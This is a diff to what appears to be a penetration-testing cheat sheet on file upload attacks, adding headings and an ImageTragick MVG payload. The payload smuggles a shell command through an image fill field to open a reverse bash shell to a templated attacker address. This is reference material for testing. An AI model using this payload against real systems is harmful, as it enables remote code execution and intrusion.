@@ -477,13 +477,22 @@ If you can make a dependency manager parse your files, this could help you:
 If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats.
 **For example**, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for [XML External Entity injection attacks](xxe).
 
+> TODO add and complete parser known exploits
+
 ### XXE on Office-like documents
 
 ### FFMPEG HLS
 
-### Image Magik
-
 ### Exiftool CVE-2021-22204
+
+### Image Tragik
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/{{ lhost attacker-ip }}/{{ lport attacker-port }} 0>&1|{{ payload id }} #"hello)'
+pop graphic-context
+```
 
 ## Other trickz 
 
